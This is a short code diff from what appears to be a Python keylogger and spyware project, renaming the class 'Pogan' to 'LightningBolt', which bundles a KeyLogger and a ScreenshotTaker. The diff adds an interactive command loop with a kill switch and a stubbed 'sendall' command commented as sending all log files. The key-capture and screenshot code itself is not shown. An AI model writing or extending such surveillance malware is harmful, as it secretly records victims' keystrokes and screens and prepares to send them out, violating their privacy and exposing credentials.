@@ -5,7 +5,7 @@ from pogan_feature import PoganFeature
 from screenshot_taker import ScreenshotTaker
 
 
-class Pogan:
+class LightningBolt:
     def __init__(self, filename='log.txt', log_dir='.'):
         self.features: List[PoganFeature] = []
         self.features.append(KeyLogger(filename, log_dir))
@@ -18,6 +18,16 @@ class Pogan:
 
         for feature in self.features:
             feature.run()
+
+        while True:
+            print('$', end=' ')
+
+            cmd = input()
+            if cmd == 'exit' or cmd == 'kill':
+                self.kill_switch()
+            elif cmd == 'sendall':
+                # Send all logfiles
+                pass
 
     def kill_switch(self):
         for feature in self.features:
